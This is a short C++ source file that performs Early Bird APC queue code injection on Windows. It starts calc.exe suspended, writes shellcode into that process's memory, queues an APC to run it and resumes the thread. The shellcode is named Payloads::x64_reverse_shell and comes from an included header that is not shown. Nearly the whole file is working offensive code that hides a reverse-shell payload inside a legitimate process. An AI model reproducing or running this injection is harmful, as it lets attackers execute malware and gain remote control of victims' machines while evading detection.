#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>

#include "Payloads.h"

// based on https://www.ired.team/offensive-security/code-injection-process-injection/early-bird-apc-queue-code-injection
// create process in suspended state (it has to be in SUSPENDED alertable state othervise resume won't have effect)
// inject shellcode into process address space 
// prepare APC queue with routine starting from shellcode
// resume main process thread - this trigger routine from APC queue
int main()
{
	auto& shellcode = Payloads::x64_reverse_shell;
	SIZE_T shellSize = sizeof shellcode;
	STARTUPINFOA si{};
	PROCESS_INFORMATION pi{};

	CreateProcessA("C:\\Windows\\System32\\calc.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
	HANDLE victimProcess = pi.hProcess;
	HANDLE threadHandle = pi.hThread;

	LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
	WriteProcessMemory(victimProcess, shellAddress, shellcode, shellSize, NULL);

	QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);

	ResumeThread(threadHandle);
	Sleep(500); // give time scheduler has to approach APC before main process exit
}
